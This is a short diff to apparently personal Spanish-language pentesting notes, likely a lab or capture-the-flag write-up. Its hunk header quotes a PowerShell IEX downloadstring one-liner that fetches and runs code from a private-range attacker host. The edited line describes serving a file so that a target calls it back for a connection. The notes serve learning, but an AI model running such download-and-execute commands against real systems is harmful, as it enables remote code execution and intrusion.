@@ -321,5 +321,6 @@ powershell IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.73:9006
 ![[Pasted image 20240724154838.png]]
 
 `Server`
-con un servidor podemos 
+con un servidor compartimos el archivo para posteriormente llamarlo y obtener una conexión
 ![[Pasted image 20240724155109.png]]
+
